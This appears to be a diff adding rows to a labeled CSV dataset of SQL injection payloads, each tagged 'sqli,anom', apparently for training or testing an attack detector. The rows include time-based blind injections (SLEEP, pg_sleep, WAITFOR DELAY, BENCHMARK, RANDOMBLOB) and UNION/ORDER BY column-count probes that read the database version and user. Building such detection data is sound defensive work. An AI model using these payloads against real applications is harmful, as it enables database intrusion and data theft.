+));waitfor delay '0:0:5'--,sqli,anom
+'));waitfor delay '0:0:5'--,sqli,anom
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+ or benchmark(10000000,MD5(1))#",sqli,anom
+"' or benchmark(10000000,MD5(1))#",sqli,anom
+"1) or benchmark(10000000,MD5(1))#",sqli,anom
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+)) or benchmark(10000000,MD5(1))#",sqli,anom
+"')) or benchmark(10000000,MD5(1))#",sqli,anom
+pg_sleep(5)--,sqli,anom
+1 or pg_sleep(5)--,sqli,anom
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+) or pg_sleep(5)--",sqli,anom
+') or pg_sleep(5)--,sqli,anom
+1)) or pg_sleep(5)--,sqli,anom
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)=",sqli,anom
+SLEEP(5)=',sqli,anom
+or SLEEP(5),sqli,anom
+or SLEEP(5)#,sqli,anom
+or SLEEP(5)--,sqli,anom
+"or SLEEP(5)=""",sqli,anom
+or SLEEP(5)=',sqli,anom
+waitfor delay '00:00:05',sqli,anom
+waitfor delay '00:00:05'--,sqli,anom
+waitfor delay '00:00:05'#,sqli,anom
+"benchmark(50000000,MD5(1))",sqli,anom
+"benchmark(50000000,MD5(1))--",sqli,anom
+"benchmark(50000000,MD5(1))#",sqli,anom
+"or benchmark(50000000,MD5(1))",sqli,anom
+"or benchmark(50000000,MD5(1))--",sqli,anom
+"or benchmark(50000000,MD5(1))#",sqli,anom
+pg_SLEEP(5),sqli,anom
+pg_SLEEP(5)--,sqli,anom
+pg_SLEEP(5)#,sqli,anom
+or pg_SLEEP(5),sqli,anom
+or pg_SLEEP(5)--,sqli,anom
+or pg_SLEEP(5)#,sqli,anom
+"'\""",sqli,anom
+AnD SLEEP(5),sqli,anom
+AnD SLEEP(5)--,sqli,anom
+AnD SLEEP(5)#,sqli,anom
+&&SLEEP(5),sqli,anom
+&&SLEEP(5)--,sqli,anom
+&&SLEEP(5)#,sqli,anom
+' AnD SLEEP(5) ANd '1,sqli,anom
+'&&SLEEP(5)&&'1,sqli,anom
+ORDER BY SLEEP(5),sqli,anom
+ORDER BY SLEEP(5)--,sqli,anom
+ORDER BY SLEEP(5)#,sqli,anom
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj),sqli,anom
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,sqli,anom
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,sqli,anom
+"+benchmark(3200,SHA1(1))+'",sqli,anom
++ SLEEP(10) + ',sqli,anom
+RANDOMBLOB(500000000/2),sqli,anom
+"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli,anom
+"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli,anom
+RANDOMBLOB(1000000000/2),sqli,anom
+"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli,anom
+"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli,anom
+"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",sqli,anom
+ORDER BY SLEEP(5),sqli,anom
+" ORDER BY 1,SLEEP(5)",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli,anom
+ ORDER BY SLEEP(5)#,sqli,anom
+" ORDER BY 1,SLEEP(5)#",sqli,anom
+" ORDER BY 1,SLEEP(5),3#",sqli,anom
+" ORDER BY 1,SLEEP(5),3,4#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli,anom
+ ORDER BY SLEEP(5)-- ,sqli,anom
+" ORDER BY 1,SLEEP(5)-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),3-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),3,4-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",sqli,anom
+" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",sqli,anom
+ UNION ALL SELECT 1,sqli,anom
+" UNION ALL SELECT 1,2",sqli,anom
+" UNION ALL SELECT 1,2,3",sqli,anom
+" UNION ALL SELECT 1,2,3,4",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli,anom
+ UNION ALL SELECT 1#,sqli,anom
+" UNION ALL SELECT 1,2#",sqli,anom
+" UNION ALL SELECT 1,2,3#",sqli,anom
+" UNION ALL SELECT 1,2,3,4#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli,anom
+ UNION ALL SELECT 1-- ,sqli,anom
+" UNION ALL SELECT 1,2-- ",sqli,anom
+" UNION ALL SELECT 1,2,3-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",sqli,anom
+" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),3",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),4",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sqli,anom
